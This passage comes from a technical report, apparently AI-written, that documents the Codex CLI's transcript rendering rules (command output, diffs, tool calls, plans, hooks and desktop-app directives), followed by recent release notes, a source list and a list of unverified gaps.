  │ this_is_a_very_long_si
  │ ngle_token_that_will_w
  │ … +2 lines
  └ error: first line on
    stderr
    error: second line on
    stderr
```

```
• Ran seq 1 10 1>&2 && false
  └ 1
    2
    … +6 lines (ctrl + t to view transcript)
    9
    10
```

```
• You ran ls
  └ file1
    file2
```

```
• Running printf 'stdout\nstderr\n'
  └ stdout
    stderr
```

Rules extracted:

1. **Command text is bash-syntax-highlighted** in place, in the header, using the active syntax theme (`highlight_bash_to_lines`, `render.rs:388`).
2. `bash -lc` wrappers are stripped before display (`strip_bash_lc_and_escape`, `render.rs:386`).
3. The command's first wrapped segment is **appended to the header line**; only the overflow goes to `│` continuation lines, and that overflow is capped at **2 lines** with `… +N lines`.
4. **stdout and stderr are interleaved in one stream** — no separate channels, no color split at the block level. (stderr *content* keeps its own ANSI colors: the truncation snapshot shows a `.red()` head line and a `.green()` tail line, both preserved through `ansi_escape_line`.)
5. **All output text carries `Modifier::DIM`** (`render.rs:143-145, 165-167`) — output is visually recessive relative to the command.
6. **Head/tail truncation, not head-only**: `output_lines()` takes up to `line_limit` from the head, up to `line_limit` from the tail, and inserts `… +{omitted} lines (ctrl + t to view transcript)` between them (`render.rs:129-169`).
7. **Wrapping happens before truncation** so a handful of very long lines can't flood the viewport (`render.rs:461-473`, comment is explicit about this).
8. Limits: **5 lines** for agent tool calls, **50 lines** for user-invoked `!` shell commands.
9. Empty output → literal **`(no output)`**, dim.
10. **Exit code and duration are NOT shown in the collapsed view.** Success/failure is conveyed *only* by the bullet color. The full `✗ (1) • 0ms` line appears **only in the ctrl+t transcript**:
    ```
    $ echo output
    head error that wraps onto the next row... 1189804 bytes
    omitted ...tail output that also wraps
    ✗ (1) • 0ms
    ```
    (`exec_cell/snapshots/..._truncated_live_output_preview_and_transcript.snap`)
    Transcript form: `$ ` prefix in **magenta**, then the highlighted command, then the output without prefixes, then `✗` red-bold + ` ({exit_code})` + ` • {duration}` dim.
11. Byte-level truncation of huge outputs is annotated inline as `... 1189804 bytes` and `omitted ...`.

## 10.4 MCP / dynamic tool calls

**[verified]**

Compact (fits one line):
```
• Calling search.find_docs({"query":"ratatui styling","limit":3})
```
```
• Called search.find_docs({"query":"ratatui styling","limit":3})
  └ Found styling guidance in styles.md
```
```
• Called search.find_docs({"query":"ratatui styling","limit":3})
  └ Error: network timeout
```

Wrapped (invocation moves below the verb; arguments hang at **+8 columns**):
```
• Called
  └ metrics.get_nearby_metric({"query":"
        very_long_query_that_needs_wrapp
        ing_to_display_properly_in_the_h
        istory","limit":1})
    Line one of the response, which is
        quite long and needs wrapping.
    Line two continues the response with
        more detail.
```

Multiple outputs, including link results:
```
• Called
  └ search.find_docs({"query":"ratatui
        styling","limit":3})
    Found styling guidance in styles.md and
        additional notes in CONTRIBUTING.md.
    link: file:///docs/styles.md
```

Rules:
- Tool identity is **`{server}.{tool}`** and arguments are shown as **raw compact JSON**, not pretty-printed.
- Errors are prefixed **`Error: `** in the output block (no separate error styling in the snapshot beyond the red bullet).
- Each output item gets its own line; URL results are labeled `link: `.
- Same green/red/shimmer bullet convention as exec (`mcp.rs:123-130`).

## 10.5 Read/search coalescing — the key grouping behaviour

**[verified]** Consecutive read-only calls are merged into **one `Explored` cell**, and consecutive `Read`s inside it are merged onto **one line** with deduplicated names.

Progression across a turn (`..._exploring_step*.snap`):
```
• Exploring
  └ List ls -la
    Read foo.txt
```
→ on completion:
```
• Explored
  └ List ls -la
    Read foo.txt, bar.txt
```

Within one call, sequential reads stay on separate lines:
```
• Explored
  └ Search shimmer_spans
    Read shimmer.rs
    Read status_indicator_widget.rs
```
Across multiple calls they collapse:
```
• Explored
  └ Search shimmer_spans
    Read shimmer.rs, status_indicator_widget.rs
```
And duplicates are removed (`..._coalesced_reads_dedupe_names.snap`).

Algorithm (`exec_cell/render.rs:271-346`): walk the call list; if a call's parsed commands are **all** `Read`, greedily extend the group over following all-`Read` calls; emit one `Read` line with `.unique()` names interspersed by **dim commas**. Any non-read call ends the group and emits its own line(s).

**This is the single most important grouping rule to replicate: N file reads = 1 line, not N cards.**

## 10.6 File edits & diffs

**[verified]** Single file:
```
• Edited example.txt (+1 -1)
    1  line one
    2 -line two
    2 +line two changed
    3  line three
```

Multiple files:
```
• Edited 2 files (+2 -1)
  └ a.txt (+1 -1)
    1 -one
    1 +one changed

  └ b.txt (+1 -0)
    1 +new
```

Rename:
```
• Edited old_name.rs → new_name.rs (+1 -1)
    1  A
    2 -B
    2 +B changed
    3  C
```

Non-contiguous hunks (`⋮` gap marker) and a *proposed* (unapplied) change:
```
• Proposed Change example.txt (+2 -2)
    1      line 1
    2     -line 2
    2     +line two changed
    3      line 3
    4      line 4
    5      line 5
    ⋮
    6      line 6
    7      line 7
    8      line 8
    9     -line 9
    9     +line nine changed
    10     line 10
```

Six-file gallery (80 cols):
```
• Edited 6 files (+9 -9)
  └ assets/banner.txt (+3 -0)
    1 +HEADER    VALUE
    2 +rocket    🚀
    3 +city    東京

  └ examples/new_sample.rs (+3 -0)
    1 +pub fn greet(name: &str) {
    2 +    println!("Hello, {name}!");
    3 +}

  └ legacy/old_script.py (+0 -3)
    1 -def legacy(x):
    2 -    return x + 1
    3 -print(legacy(3))

  └ scripts/calc.txt → scripts/calc.py (+1 -1)
    1  def add(a, b):
    2 -    return a + b
    2 +    return a + b + 42
    3 
    4  print(add(1, 2))
```

Rules (`diff_render.rs:380-470, 1151-1315`):

1. **Unified diff, never side-by-side.** Format per line: `{right-aligned line number}{space}{sign}{content}`, where sign ∈ `+`, `-`, ` `.
2. **Header carries the summary**: `(+{added} -{removed})` with **`+N` in green and `-M` in red**, parentheses in default color (`render_line_count_summary`, `:1160-1168`).
3. **Single file** → verb + path + counts on the header line; **no per-file sub-header** (it would duplicate).
4. **Multiple files** → header becomes `Edited {n} files (+total -total)`, then one `  └ {path} (+a -b)` sub-header per file, blank line between file chunks, diff body indented 4 columns.
5. Verb is derived per-change: `Add` → **`Added`**, `Delete` → **`Deleted`**, otherwise **`Edited`** (`:428-434`). Multi-file always says `Edited`.
6. **Renames** render `old → new` in the path slot; **syntax highlighting uses the destination extension** (`:463-465`).
7. Files are **sorted by path** (`:1149`).
8. Non-adjacent hunks are separated by a lone **`⋮`** in the gutter column.
9. Line numbers: the *old* number on delete lines, the *new* number on insert lines, shared on context lines. Gutter width adapts to the largest number (`line_number_width`).
10. Diff content is **syntax highlighted per language**, with add/del backgrounds composited underneath. On delete lines the syntax colors get a `DIM` overlay (`:890`).
11. Diff body wraps at `width - 4` and wrapped continuations preserve the tinted background.
12. **[unknown]** There is no per-file collapse/expand in the CLI diff cell — everything is rendered inline. Large-diff behaviour beyond wrapping (e.g. a hard cap on rendered hunks) is not visible in the snapshots reviewed.

## 10.7 Plans / todos

**[verified]**
```
• Updated Plan
  └ I'll update Grafana call
    error handling by adding
    retries and clearer messages
    when the backend is
    unreachable.
    ✔ Investigate existing error
      paths and logging around
      HTTP timeouts
    □ Harden Grafana client
      error handling with retry/
      backoff and user-friendly
      messages
    □ Add tests for transient
      failure scenarios and
      surfacing to the UI
```
- Optional free-text note first, then the checklist.
- **`✔ `** = completed, rendered **crossed-out + dim** (`plans.rs:188`). **`□ `** = pending.
- Item continuation lines indent to align under the text, not the box.
- Header is `Updated Plan` or `Proposed Plan` (the latter is a hyperlink line — `plans.rs:111`).

## 10.8 Reasoning vs action separation

**[verified]** Reasoning summaries and assistant messages use the **same `• ` dim prefix** as tool cells but with **no bold verb** — the absence of a verb is the differentiator (`history_cell/messages.rs:263, 323, 437-452`).

```
• I need to check the codex-rs repository to explain why the project's binaries
  are large. …

─ Worked for 0s ────────────────────────────────────────────────────────────────

• I'm going to scan the workspace and Cargo manifests to see build profiles and
  dependencies that impact binary size. Then I'll summarize the main causes.

• Explored
  └ List ls -la
    Read Cargo.toml

• I'm reviewing the workspace's release profile, which has settings like
  lto=fat, strip=symbols, and codegen-units=1 to reduce binary size. …
```

- **[verified]** `ReasoningSummaryCell` has a `transcript_only` flag: when set, it renders **nothing** in the main view and appears **only in the ctrl+t transcript** (`messages.rs:271-286`). That is the CLI's "collapse reasoning" affordance.
- **[verified]** Reasoning has its own `summary_style` patched over every span (`messages.rs:250-262`).
- **[verified]** User messages use **`› `** (bold+dim) with a blank line above and below, and a background tint (§3.2) (`messages.rs:174-196`).
- **[verified]** Assistant messages get `• ` only on their **first** line; subsequent lines indent 2 spaces and preserve leading whitespace (`messages.rs:437-460`).
- **[verified]** Empty reasoning summaries are suppressed entirely (changelog `rust-v0.145.0`, #31652).

## 10.9 Turn boundaries & timing

**[verified]** `codex-rs/tui/src/history_cell/separators.rs`

- Every turn that **did concrete work** (ran commands, applied patches, made MCP calls) ends with a full-width horizontal rule; purely conversational turns get no divider.
- If the turn took **> 60 s**, the rule is labeled: `─ Worked for {elapsed} ─────────…`
- Optional runtime metrics join with ` • `:
  - `Local tools: {n} call(s) ({duration})`
  - `Inference: {n} call(s) ({duration})`
- Unlabeled turns get a plain dim `─` rule of full width.
- The whole line is **dim**.

Examples:
```
────────────────────────────────────────────────────────────────────────────────

─ Worked for 2m 05s ────────────────────────────────────────────────────────────
```
```
─ Worked for 0s ────────────────────────────────────────────────────────────────
```
(the `0s` variant appears in a test using a synthetic duration; production gates at >60 s)

**Per-call timing is not shown in the main view** — only in the transcript (`• {duration}` after the exit code) and in the aggregate turn footer.

## 10.10 Queued input & interruption

**[verified]**
```
• Queued follow-up inputs
  ↳ Hello, world! 0
  ↳ Hello, world! 1
  …
```
`↳ ` is the "queued/nested" glyph. It's also used for background-terminal interactions (`history_cell/exec.rs:31`).

## 10.11 Desktop-app-specific: inline directives in assistant markdown

**[verified] — this is direct evidence of desktop-app rendering.** `codex-rs/tui/src/git_action_directives.rs` exists solely to *strip or downgrade* markers the **Codex App** renders as rich UI. Header comment: *"Codex App directives embedded in assistant markdown."*

### `::code-comment{…}` — inline review findings

Syntax (1–3 leading colons):
```
::code-comment{title="Fix body= parsing" body="Keep role=\"tab\", …" file="/repo/src/app.ts" start=10 end=12 priority="P2"}
```
Attributes: `title`, `body`, `file` (all required), `start`, `end`, `priority`.

- **[verified]** Priority is **P0–P3** (`directive_integer(&attributes, "priority")` matched against `0..=3`, `git_action_directives.rs:112`); the `P` prefix is stripped when parsing.
- **[verified]** The CLI downgrades the directive to plain markdown:
  ```
  - [P2] Fix body= parsing — src/app.ts:10-12
    Keep role="tab", …
  ```
  Location is `{file}:{start}` when `start == end`, else `{file}:{start}-{end}`; the path is relativized to cwd and backslashes normalized to `/`.
- **[inferred]** In the **desktop app** this renders as an **anchored inline code-review comment** with a **priority badge (P0–P3)**, a title, a body, and a file:line-range link — i.e. the app's code-review findings UI is priority-tagged and file-anchored.

### `::git-*{…}` — actionable git buttons

**[verified]** Recognized directives and their attributes (`git_action_directives.rs:196-227`):

| Directive | Attributes |
|---|---|
| `::git-stage{cwd=…}` | `cwd` |
| `::git-commit{cwd=…}` | `cwd` |
| `::git-create-branch{cwd=… branch=…}` | `cwd`, `branch` |
| `::git-push{cwd=… branch=…}` | `cwd`, `branch` |
| `::git-create-pr{cwd=… branch=… url=… isDraft=true|false}` | `cwd`, `branch`, `url`, `isDraft` |

- **[verified]** The CLI **strips these from the visible text entirely** and collects them as actions (deduplicated, order-preserving).
- **[inferred]** In the desktop app these become **inline action buttons/affordances in the assistant message** — Stage, Commit, Create branch, Push, **Create PR (with draft support and a URL)**. This confirms first-class Git integration rendered *inside the transcript*, not only in a side panel.

## 10.12 Hooks (lifecycle) rendering

**[verified]**
```
• PreToolUse (completed) says: Heads up from the hook
  hook context: Remember the startup checklist.
```
```
• SessionStart hook (stopped)
  hook context: This hook context is intentionally long enough to wrap across
    several terminal rows while keeping the complete value available in the
    … +2 lines (ctrl + t to view transcript)
  stop: The hook stopped this turn for an important reason.
    This second line must remain visible in full.
```
- Pattern: `• {HookName} ({status})[ says: {message}]`, then labeled sub-blocks `hook context:` / `stop:`.
- Identical parallel hooks collapse to a count: `Running {n} {label} hooks` (`hook_cell.rs:739`).
- Bullet colors per §3.4.

## 10.13 Structured questions

**[verified]** `history_cell/request_user_input.rs:28,59` — header `• Questions` (bold), and secret/masked values render as `••••••`. Option labels observed: `Review the diff`, `Review a diff`.

---

# 11. What changed recently

## 11.1 CLI (from GitHub release notes — https://github.com/openai/codex/releases)

**`rust-v0.145.0` (2026-07-21)** — UI-relevant:
- *"Added experimental paginated thread history with efficient resume, search, persisted names, sub-agent support, and memories."* (#33364, #33907, #34085, #34229, #34386)
- *"Stabilized the opt-in multi-agent V2 experience with configurable sub-agent models, reasoning levels, concurrency, restored roles, and improved agent navigation."* (#33550, #33631, #33657, #33841, #34383)
- *"Added secure, clickable inline visualization links in the terminal UI."* (#33925, #34217, #34346) ← this is the `inline_visualization` / `visualize.css` feature.
- *"Improved terminal responsiveness for long conversations and streamed output through incremental Markdown rendering, fewer redraws, caching, and bounded command output."* (#34045, #34049, #34216, #34223, #34359)
- *"Editing an earlier prompt or retrying a safety-buffered turn now creates a contextual branch, preserving the original conversation, attachments, and mention bindings."* (#33201, #33207, #33211)
- *"Strengthened safety and approval handling with better forced-`rm` detection, consistent full-access confirmation, and preserved rejection reasons across tools."* (#32989, #33464, #34400)
- *"Migrated bundled GPT-5.4 selections and internal uses to the corresponding GPT-5.6 Terra and Luna variants."*
- #31652 *"fix(tui): hide empty reasoning summaries"*; #31813 *"tui: update safety buffering copy"*.
- *"Expanded `/import` to migrate Cursor and Claude Code settings, MCP servers, plugins, sessions, commands, and project-scoped memories."*
- Audio inputs/tool outputs + streaming realtime V3 conversations.

**`rust-v0.144.0` (2026-07-09)**:
- *"Usage-limit reset credits now show their type and expiration, and let you choose which credit to redeem."* (#30488)
- *"Added a `writes` app-approval mode that allows declared read-only actions while prompting for writes."* (#30482) ← **new approval mode**
- *"Selecting Ultra reasoning now warns when high multi-agent concurrency could increase usage quickly."* (#31621)
- *"Pasted terminal control sequences can no longer corrupt TUI rendering."* (#31494)
- *"Made the `/review` branch picker faster and more reliable in large repositories."* (#31464); *"Align empty branch list message with search"* (#31465)
- *"Improved automatic review behavior with clearer instructions and a focused tool set."* (#31480)
- #31312 *"Use model catalog approval messages"* — approval copy is now model-catalog-driven.

**`rust-v0.143.0` (2026-07-08)**:
- *"Remote plugins are now enabled by default, with richer catalog rows, npm marketplace sources, and visible remote/local versions."*
- *"App-server clients can inspect environments, list descendant threads, and fork history through a specific turn."* (#30291, #29591, #30277) ← powers the app's parallel-task/branch UI
- *"Fixed stale TUI safety prompts and cancelled reviews that could leave MCP startup appearing busy."*
- #29488 *"[plugins] Add dark-mode logo metadata"* ← **plugins ship separate dark-mode logos**

## 11.2 Model lineup (as reflected in the picker)

**[verified]** `gpt-5.6-sol` is the **default** ("Latest frontier agentic coding model"), with `gpt-5.6-terra` (balanced), `gpt-5.6-luna` (fast/affordable), `gpt-5.5`, `gpt-5.2` also listed. Reasoning levels: `Low`, `Medium (default)`, `High`, `Extra high`, and a `More reasoning…` submenu for `Max` and `Ultra`.

## 11.3 Desktop app changelog

**[unknown / partially verified]** OpenAI maintains a Codex changelog at **https://learn.chatgpt.com/docs/changelog**. Third-party reporting attributes to recent app releases: *collapsible sidebar sections*, *tray usage-limit surfacing*, a *command-palette theme switcher*, *better diff batching*, and *preserved diff and search state*. Dated per-entry confirmation was not obtained — see GAPS.

---

# 12. Source list

| # | URL | Used for |
|---|---|---|
| 1 | https://github.com/openai/codex (commit `4d1f66bf`, 2026-07-27) | All source-code and snapshot evidence |
| 2 | https://github.com/openai/codex/releases | §11 changelog |
| 3 | https://github.com/openai/codex/issues/16415 | Desktop app thread UI collapses tool calls by default |
| 4 | https://learn.chatgpt.com/docs/app (← `developers.openai.com/codex/app`, 308) | App positioning, Chat/Work toggle, projects, artifacts viewer |
| 5 | https://developers.openai.com/codex/app/review/ | Code review surface exists |
| 6 | https://learn.chatgpt.com/docs/changelog | Codex changelog (see GAPS) |
| 7 | https://chatgpt.com/codex?app-landing-page=true | App landing page (referenced by CLI tooltip) |
| 8 | https://every.to/vibe-check/codex-vibe-check | Third-party app review |
| 9 | https://getpushtoprod.substack.com/p/complete-beginners-guide-to-openais | Third-party app walkthrough |
| 10 | https://medium.com/@ariaxhan/i-tested-openais-new-codex-desktop-app-the-ui-is-the-real-product-c2c59bdcb5f6 | Third-party app UI review |
| 11 | https://marketplace.visualstudio.com/items?itemName=openai.chatgpt | Codex IDE extension listing |

Key file paths inside source #1:

```
codex-rs/tui/src/inline_visualization/assets/visualize.css   ← design tokens (colors, radii, type, motion)
codex-rs/tui/src/color.rs                                    ← luma + CIE76 color math
codex-rs/tui/src/style.rs                                    ← accent, user-message bg, separators
codex-rs/tui/src/ui_consts.rs                                ← gutter width, transcript hint
codex-rs/tui/src/shimmer.rs                                  ← shimmer algorithm
codex-rs/tui/src/motion.rs                                   ← motion mode + reduced-motion contract
codex-rs/tui/src/status_indicator_widget.rs                  ← status line format + elapsed formatting
codex-rs/tui/src/exec_cell/render.rs                         ← exec cell layout, verbs, truncation
codex-rs/tui/src/diff_render.rs                              ← diff colors + unified diff rendering
codex-rs/tui/src/markdown_render.rs                          ← markdown token styles
codex-rs/tui/src/render/highlight.rs                         ← syntect themes, adaptive default
codex-rs/tui/src/history_cell/*.rs                           ← every transcript cell type
codex-rs/tui/src/bottom_pane/approval_overlay.rs             ← approval prompt copy
codex-rs/tui/src/bottom_pane/footer.rs                       ← footer collapse logic
codex-rs/tui/src/slash_command.rs                            ← full slash-command list
codex-rs/tui/src/git_action_directives.rs                    ← DESKTOP APP directive contract
codex-rs/tui/src/chatwidget/notifications.rs                 ← OS notification copy
codex-rs/config/src/types.rs                                 ← [tui] config surface
codex-rs/tui/src/**/snapshots/*.snap                         ← 613 literal rendered-UI fixtures
```

---

# GAPS I COULD NOT VERIFY

These need user screenshots or an installed app. Grouped by how blocking they are.

## Blocking for pixel parity

1. **Every desktop-app color value.** The `visualize.css` tokens are for *agent-authored HTML embedded in Codex*, described in-file as an "Agent-facing contract." They are almost certainly derived from the same design system as the app chrome, but I could not confirm the app's own sidebar/titlebar/transcript backgrounds, hover fills, or selected-row colors. **Need: screenshots of the app in light and dark, plus a color-picked sample of sidebar bg, main bg, panel bg, and selected-row bg.**
2. **App typography.** `visualize.css` uses `-apple-system, system-ui, "Segoe UI"`. Whether the app chrome uses a licensed OpenAI face (e.g. an "OpenAI Sans") is unconfirmed. **Need: a screenshot at 2× of a heading + body text, or a DevTools computed-style dump.**
3. **Window chrome.** Titlebar height, traffic-light inset, whether the titlebar is fully custom (`-webkit-app-region` appears in the CSS, so it is at minimum partially custom), whether there is a unified toolbar. **Need: a screenshot of the top 80px of the window on macOS and Windows.**
4. **Pane geometry.** Default sidebar width, right-panel width, min/max, whether panes are resizable by drag, whether the right panel is tabbed (Diff / Terminal / Browser) or toggled. **Need: screenshots at two window widths.**
5. **Tab model.** Whether threads/tasks are tabs, a list, or both; whether multiple projects can be open simultaneously; what a "parallel task" row looks like while running vs done. **Need: a screenshot with ≥3 concurrent tasks.**

## Blocking for interaction parity

6. **Tool-call rendering in the app.** Issue #16415 proves calls are collapsed by default, but I could not confirm: whether each call is a card or a row; the exact icon per tool type; whether there is a per-call chevron; what the expanded form shows; whether exit codes/durations are visible in the app (they are hidden in the CLI's collapsed view). **Need: screenshots of a turn with a shell command, a file edit, and an MCP call, both collapsed and expanded.**
7. **Approval prompts in the app.** Whether they are inline in the transcript (as in the CLI) or a modal; whether the option list matches the CLI verbatim (`Yes, proceed` / `Yes, and don't ask again for …` / `No, and tell Codex what to do differently`); whether the "risk: high" guardian label surfaces visually. **Need: a screenshot of a pending approval.**
8. **Diff viewer in the app.** Unified vs side-by-side (CLI is unified-only); per-file collapse; whether the GitHub palette (`#dafbe1` / `#ffebe9` / `#213A2B` / `#4A221D`) carries over to the app; how large diffs are summarized. **Need: a screenshot of the diff sidebar with ≥3 changed files.**
9. **Code review UI.** The `::code-comment` directive proves priority-tagged (P0–P3), file-anchored findings exist. I could not confirm their visual treatment — badge color per priority, whether they anchor to gutter markers, whether they group by file. **Need: a screenshot of a completed `/review`.**
10. **Git action buttons.** `::git-stage` / `::git-commit` / `::git-create-branch` / `::git-push` / `::git-create-pr` render as *something* in the app. Button style, placement (inline in message vs pinned bar), and the draft-PR affordance are unconfirmed. **Need: a screenshot of a turn that ends in a commit/PR suggestion.**
11. **Command palette.** Reported to exist (theme switcher lives there). Invocation key, row layout, grouping, and whether it doubles as the slash-command surface are unconfirmed. **Need: a screenshot with the palette open.**
12. **Terminal panel styling.** Font, size, background, whether it is a real PTY, whether ANSI colors follow the app theme. **Need: a screenshot of the terminal panel.**
13. **Browser preview panel.** Whether it exists at all in the desktop app (as opposed to Codex cloud). **Unconfirmed entirely.**

## Non-blocking but wanted

14. **Loading / skeleton states.** No skeleton classes exist in `visualize.css`; app-level loading treatment is unknown.
15. **App empty states.** No-projects, no-threads, first-run. Unknown copy and art.
16. **Completion notification in the app.** The CLI's OS notification strings are known (§9.7). Whether the app uses the same copy, plus badge/sound/toast behaviour, is unknown.
17. **Icon inventory.** Lucide at stroke-width 1.6 is confirmed for embedded HTML; the icon *sizes* and the specific glyph choices in app chrome are unknown.
18. **Motion in app chrome.** Only three transitions exist in `visualize.css` (150ms color, 200ms transform, `cubic-bezier(0,0,0.2,1)`). Panel open/close, thread switch, and streaming-cursor motion are unknown.
19. **Dated desktop-app changelog entries.** `learn.chatgpt.com/docs/changelog` exists but per-entry UI changes with dates were not captured; third-party summaries (collapsible sidebar sections, tray usage limits, command-palette theme switcher, diff batching, preserved diff/search state) are secondhand.
20. **Letter-spacing.** No tracking token exists anywhere in the CSS; if the app applies negative tracking to display text it is invisible to this analysis.
21. **VS Code / IDE extension panel layout.** The extension shares the `app-server` backend and the same prompt-context delimiter as the desktop app (`codex-rs/tui/src/ide_context/prompt.rs:12`), but its own panel chrome was not captured.
